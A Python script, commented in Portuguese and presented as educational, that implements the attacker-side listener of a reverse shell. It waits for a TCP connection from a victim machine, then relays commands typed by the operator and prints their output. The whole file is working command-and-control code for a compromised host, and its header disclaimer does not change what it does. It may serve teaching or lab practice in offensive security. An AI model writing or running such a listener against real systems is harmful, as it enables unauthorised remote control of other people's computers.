```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
server.py (Parte do Atacante)

Descrição:
Este é o "servidor" ou "listener" do shell reverso.
Ele fica na máquina do atacante, aguardando uma conexão
da máquina da vítima.

AVISO: Este script é apenas para fins educacionais.
Nunca use em sistemas sem autorização explícita.

Autor: Ana Luísa Valeriano Bomfim
Data: 6 de Junho de 2025
"""

import socket
import argparse
import sys

# --- Constantes de Cores ---
C_RED = '\033[91m'
C_GREEN = '\033[92m'
C_YELLOW = '\033[93m'
C_CYAN = '\033[96m'
C_BOLD = '\033[1m'
C_END = '\033[0m'

def start_listener(listen_ip, listen_port):
    """
    Inicia o socket do servidor para escutar por conexões.
    """
    # Cria o socket
    # AF_INET = IPv4, SOCK_STREAM = TCP
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Permite que o endereço seja reutilizado (evita erro 'Address already in use')
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        # Vincula o socket ao IP e porta especificados
        server_socket.bind((listen_ip, listen_port))
    except socket.error as e:
        print(f"{C_RED}[ERRO] Falha ao vincular (bind): {e}{C_END}")
        sys.exit(1)
        
    # Começa a escutar, permitindo 1 conexão na fila
    server_socket.listen(1)
    
    print(f"{C_CYAN}[INFO] Servidor escutando em {listen_ip}:{listen_port}...{C_END}")
    print("Aguardando conexão da vítima...")
    
    try:
        # Aceita a conexão
        # conn = o objeto da conexão (para enviar/receber dados)
        # addr = o endereço (IP, porta) da vítima
        conn, addr = server_socket.accept()
    except KeyboardInterrupt:
        print(f"\n{C_YELLOW}[AVISO] Servidor interrompido pelo usuário.{C_END}")
        server_socket.close()
        sys.exit(0)
        
    print(f"\n{C_GREEN}{C_BOLD}[SUCESSO] Conexão recebida de: {addr[0]}:{addr[1]}{C_END}")
    
    # Entra no loop principal do shell
    shell_loop(conn)
    
    # Fecha as conexões
    conn.close()
    server_socket.close()

def shell_loop(conn):
    """
    Loop principal que envia comandos e recebe resultados.
    """
    while True:
        try:
            # Pede o comando ao atacante
            cmd = input(f"{C_BOLD}shell@{conn.getpeername()[0]}${C_END} ").strip()
            
            if not cmd:
                continue
                
            if cmd.lower() == 'exit':
                print(f"{C_YELLOW}[INFO] Enviando comando 'exit' para a vítima...{C_END}")
                conn.sendall(cmd.encode('utf-8'))
                break # Sai do loop do servidor
            
            # Envia o comando para a vítima
            conn.sendall(cmd.encode('utf-8'))
            
            # Recebe o resultado da vítima
            # 4096 bytes = buffer de 4KB
            # A decodificação 'utf-8', 'ignore' evita erros com caracteres inválidos
            output = conn.recv(4096).decode('utf-8', 'ignore')
            
            # Imprime o resultado para o atacante
            print(output)
            
        except KeyboardInterrupt:
            print(f"\n{C_YELLOW}[AVISO] Interrupção detectada. Digite 'exit' para fechar o shell.{C_END}")
        except socket.error as e:
            print(f"\n{C_RED}[ERRO] Conexão perdida: {e}{C_END}")
            break # Sai do loop se a conexão cair

def main():
    parser = argparse.ArgumentParser(
        description="Servidor (Listener) para um Shell Reverso Básico.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "-p", "--port",
        dest="port",
        type=int,
        required=True,
        help="A porta em que o servidor deve escutar."
    )
    parser.add_argument(
        "-i", "--ip",
        dest="ip",
        default="0.0.0.0",
        help="O IP em que o servidor deve escutar.\n(Default: 0.0.0.0 - todos os IPs da máquina)"
    )
    
    args = parser.parse_args()
    
    start_listener(args.ip, args.port)

if __name__ == "__main__":
    main()
